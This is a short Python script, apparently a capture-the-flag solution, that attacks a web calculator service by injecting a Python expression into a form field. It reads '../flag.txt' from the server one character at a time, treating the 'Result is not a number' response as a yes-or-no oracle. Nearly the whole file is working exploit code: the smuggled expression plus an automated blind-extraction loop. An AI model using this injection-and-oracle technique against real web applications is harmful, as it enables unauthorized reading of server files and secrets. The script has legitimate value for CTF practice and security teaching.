#!/usr/bin/env python3

import string

import requests

url = "https://maas.rars.win/calculator"

pos = 0
flag = ""
while not flag.endswith("}"):
    for guess in string.printable:
        form_data = {
            "mode": "arithmetic",
            "add": "+",
            "n1": f"0 if ord(open('../flag.txt').read()[{pos}]) == {ord(guess)} else 'x'",
            "n2": " "
        }

        r = requests.post(url, data=form_data)
        if "Result is not a number" in r.text:
            # Guess was wrong.
            continue

        pos += 1
        flag += guess
        print(flag)
        break
